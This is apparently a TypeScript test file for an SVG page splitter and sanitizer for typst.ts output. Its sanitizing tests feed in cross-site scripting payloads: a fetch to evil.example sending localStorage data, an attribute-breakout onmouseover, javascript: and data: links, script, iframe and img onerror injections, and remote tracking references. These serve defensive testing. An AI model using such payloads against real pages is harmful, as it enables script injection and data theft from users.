import { splitSvgPages } from "./svg-pages";

const root =
  '<svg class="typst-doc" viewBox="0 0 596 1684" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">';
const defs = (glyphs: string) =>
  `<style>.typst-text{}</style><defs class="glyph">${glyphs}</defs>`;
const page = (tid: string, y: number) =>
  `<g class="typst-page" transform="translate(0, ${y})" data-tid="${tid}" data-page-width="596" data-page-height="842"><g class="typst-group"><use xlink:href="#g1"/></g></g>`;

describe("splitSvgPages", () => {
  it("splits pages into standalone svgs and collects the defs", () => {
    const doc = splitSvgPages(
      root +
        defs('<path id="g1" d="M0 0"/>') +
        page("p1", 0) +
        page("p2", 842) +
        "</svg>",
    );
    expect(doc.pages.map((p) => [p.tid, p.width, p.height])).toEqual([
      ["p1", 596, 842],
      ["p2", 596, 842],
    ]);
    const second = doc.pages[1]!.element;
    expect(second.getAttribute("viewBox")).toBe("0 0 596 842");
    expect(
      second.querySelector("g.typst-page")?.hasAttribute("transform"),
    ).toBe(false);
    expect(doc.defs.querySelector("#g1")).not.toBeNull();
    expect(doc.defs.querySelector("style")).not.toBeNull();
  });

  it("reuses unchanged pages and defs from the previous render", () => {
    const glyphs = '<path id="g1" d="M0 0"/>';
    const first = splitSvgPages(
      root + defs(glyphs) + page("a", 0) + page("b", 842) + "</svg>",
    );
    const second = splitSvgPages(
      root + defs(glyphs) + page("a", 0) + page("c", 842) + "</svg>",
      first,
    );
    expect(second.defs).toBe(first.defs);
    expect(second.pages[0]).toBe(first.pages[0]);
    expect(second.pages[1]).not.toBe(first.pages[1]);
    expect(second.pages[1]!.tid).toBe("c");

    const third = splitSvgPages(
      root +
        defs(glyphs + '<path id="g2" d="M1 1"/>') +
        page("a", 0) +
        "</svg>",
      second,
    );
    expect(third.defs).not.toBe(second.defs);
    expect(third.pages).toEqual([second.pages[0]]);
  });

  it("does not hand the same element to two identical pages", () => {
    const first = splitSvgPages(root + defs("") + page("same", 0) + "</svg>");
    const second = splitSvgPages(
      root + defs("") + page("same", 0) + page("same", 842) + "</svg>",
      first,
    );
    expect(second.pages[0]).toBe(first.pages[0]);
    expect(second.pages[1]!.element).not.toBe(first.pages[0]!.element);
  });

  it("handles a document without pages", () => {
    expect(splitSvgPages(root + defs("") + "</svg>").pages).toEqual([]);
  });
});

describe("sanitizing", () => {
  const XLINK = "http://www.w3.org/1999/xlink";
  // Mirrors typst.ts' render_link: `@typst:` targets go into onclick
  // unescaped, everything else into an escaped xlink:href.
  const link = (href: string) =>
    href.startsWith("@typst:")
      ? `<a xlink:href="#" onclick="${href.slice(7)}; return false"><rect class="pseudo-link" width="9" height="9"></rect></a>`
      : `<a target="_blank" xlink:href="${href.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"><rect class="pseudo-link" width="9" height="9"></rect></a>`;
  const pageWith = (content: string) =>
    `<g class="typst-page" data-tid="t" data-page-width="596" data-page-height="842">${content}</g>`;
  const render = (content: string, defsContent = "") =>
    splitSvgPages(root + defs(defsContent) + pageWith(content) + "</svg>");

  function attributesOf(el: Element): string[] {
    return [el, ...el.querySelectorAll("*")].flatMap((e) =>
      Array.from(e.attributes, (a) => a.name),
    );
  }

  it("drops script smuggled into an @typst: link", () => {
    const page = render(
      link("@typst:fetch('https://evil.example/?'+localStorage.length)") +
        // Breaks out of onclick's quotes to add an attribute of its own.
        link(`@typst:0" onmouseover="alert(1)`),
    ).pages[0]!.element;
    expect(attributesOf(page).filter((a) => /^on/i.test(a))).toEqual([]);
    const anchors = page.querySelectorAll("a");
    expect(anchors).toHaveLength(2);
    // The "#" target goes too: following it would replace the fragment
    // that holds the project key.
    for (const a of anchors) {
      expect(a.getAttributeNS(XLINK, "href")).toBe(null);
    }
  });

  it("drops internal jump links, which never had a handler here", () => {
    const page = render(
      link("@typst:handleTypstLocation(this, 2, 10.00, 20.00)"),
    ).pages[0]!.element;
    expect(page.querySelector("a")!.attributes).toHaveLength(0);
  });

  it("keeps web links and drops script and data links", () => {
    const page = render(
      link("https://typst.app/docs?a=1&b=2") +
        link("mailto:someone@example.com") +
        link("javascript:alert(1)") +
        link("java\tscript:alert(1)") +
        link("data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"),
    ).pages[0]!.element;
    const hrefs = Array.from(page.querySelectorAll("a"), (a) =>
      a.getAttributeNS(XLINK, "href"),
    );
    expect(hrefs).toEqual([
      "https://typst.app/docs?a=1&b=2",
      "mailto:someone@example.com",
      null,
      null,
      null,
    ]);
    expect(page.querySelector("a")!.getAttribute("rel")).toBe(
      "noopener noreferrer",
    );
  });

  it("removes elements typst.ts never emits", () => {
    const doc = render(
      '<script>alert(1)</script><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example"/>' +
        '<a xlink:href="https://typst.app"><set attributeName="href" to="javascript:alert(1)"/></a>' +
        '<foreignObject><h5:div xmlns:h5="http://www.w3.org/1999/xhtml" class="tsel">text<h5:img src="x" onerror="alert(1)"/></h5:div></foreignObject>',
      '<script>alert(2)</script><path id="g1" d="M0 0"/>',
    );
    const page = doc.pages[0]!.element;
    for (const tag of ["script", "iframe", "set", "img"]) {
      expect(page.getElementsByTagNameNS("*", tag)).toHaveLength(0);
      expect(doc.defs.getElementsByTagNameNS("*", tag)).toHaveLength(0);
    }
    // The text selection layer stays.
    expect(page.getElementsByTagNameNS("*", "div")).toHaveLength(1);
    expect(doc.defs.querySelector("#g1")).not.toBeNull();
  });

  it("keeps internal references and embedded images", () => {
    const page = render(
      '<use xlink:href="#g1"/><use xlink:href="https://evil.example/x.svg#a"/>' +
        '<image xlink:href="data:image/png;base64,AAAA"/><image xlink:href="https://evil.example/track.png"/>',
      '<path id="g1" d="M0 0"/>',
    ).pages[0]!.element;
    const hrefs = Array.from(page.querySelectorAll("use, image"), (el) =>
      el.getAttributeNS(XLINK, "href"),
    );
    expect(hrefs).toEqual(["#g1", null, "data:image/png;base64,AAAA", null]);
  });
});
